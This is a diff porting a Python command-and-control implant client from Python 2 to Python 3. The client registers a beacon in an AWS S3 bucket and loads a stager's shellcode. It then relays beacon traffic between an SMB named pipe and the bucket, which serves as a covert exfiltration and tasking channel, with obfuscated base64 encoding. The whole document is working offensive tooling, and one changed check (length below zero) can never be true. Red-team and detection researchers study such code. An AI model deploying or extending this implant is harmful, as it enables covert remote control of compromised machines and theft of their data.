@@ -6,7 +6,7 @@ import struct
 
 # Encoder imports:
 import base64
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 # Transport imports:
 import boto3
@@ -47,10 +47,10 @@ respKeyName = beaconId + ':RespForYou'
 # <encoder functions>
 def encode(data):
     data = base64.b64encode(data)
-    return urllib.quote_plus(data)[::-1]
+    return urllib.parse.quote_plus(data)[::-1]
 
 def decode(data):
-    data = urllib.unquote(data[::-1])
+    data = urllib.parse.unquote(data[::-1])
     return base64.b64decode(data)
 # </encoder functions>
 
@@ -67,9 +67,9 @@ def sendData(data):
     This function should be _very_ similar to the server sendData.
     """
     respKey = "{}:{}".format(respKeyName, str(uuid.uuid4()))
-    print 'got body contents to send'
+    print('got body contents to send')
     s3.put_object(Body=encode(data), Bucket=bucketName, Key=respKey)
-    print 'sent ' + str(len(data)) + ' bytes'
+    print('sent ' + str(len(data)) + ' bytes')
 
 def recvData():
     """
@@ -113,7 +113,7 @@ def registerClient():
     """
     keyName = "AGENT:{}".format(beaconId)
     s3.put_object(Body="", Bucket=bucketName, Key=keyName)
-    print "[+] Registering new agent {}".format(keyName)
+    print("[+] Registering new agent {}".format(keyName))
 
 # </transport functions>
 
@@ -140,28 +140,28 @@ lib.write_frame.restype = c_int
 def WritePipe(hPipe,chunk):
     sys.stdout.write('wp: %s\n'%len(chunk))
     sys.stdout.flush()
-    print chunk
+    print(chunk)
     ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
     sleep(3) 
-    print "ret=%s"%ret
+    print("ret=%s"%ret)
     return(ret)
 
 def go():
     # Register beaconId so C2 server knows we're waiting
     registerClient()
     # LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
-    print "Waiting for stager..." # DEBUG
+    print("Waiting for stager...") # DEBUG
     p = recvData()
     # First time initialization, only one task returned.
     p = p[0]
-    print "Got a stager! loading..."
+    print("Got a stager! loading...")
     sleep(2)
     # print "Decoded stager = " + str(p) # DEBUG
     # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
     handle_beacon = start_beacon(p)
 
     # Grabbing and relaying the metadata from the SMB pipe is done during interact()
-    print "Loaded, and got handle to beacon. Getting METADATA."
+    print("Loaded, and got handle to beacon. Getting METADATA.")
 
     return handle_beacon
 
@@ -171,23 +171,23 @@ def interact(handle_beacon):
         
         # LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
         chunk = ReadPipe(handle_beacon)
-        if chunk < 0:
-            print 'readpipe %d' % (len(chunk))
+        if len(chunk) < 0:
+            print('readpipe %d' % (len(chunk)))
             break
         else:
-            print "Received %d bytes from pipe" % (len(chunk))
-        print "relaying chunk to server"
+            print("Received %d bytes from pipe" % (len(chunk)))
+        print("relaying chunk to server")
         sendData(chunk)
 
         # LOGIC TO CHECK FOR A NEW TASK
-        print "Checking for new tasks from transport"
+        print("Checking for new tasks from transport")
         
         newTasks = recvData()
         for newTask in newTasks:
-            print "Got new task: %s" % (newTask)
-            print "Writing %s bytes to pipe" % (len(newTask))
+            print("Got new task: %s" % (newTask))
+            print("Writing %s bytes to pipe" % (len(newTask)))
             r = WritePipe(handle_beacon, newTask)
-            print "Write %s bytes to pipe" % (r)
+            print("Write %s bytes to pipe" % (r))
 
 # Prepare the transport module
 prepTransport()
@@ -199,5 +199,5 @@ handle_beacon = go()
 try:
     interact(handle_beacon)
 except KeyboardInterrupt:
-    print "Caught escape signal"
+    print("Caught escape signal")
     sys.exit(0)
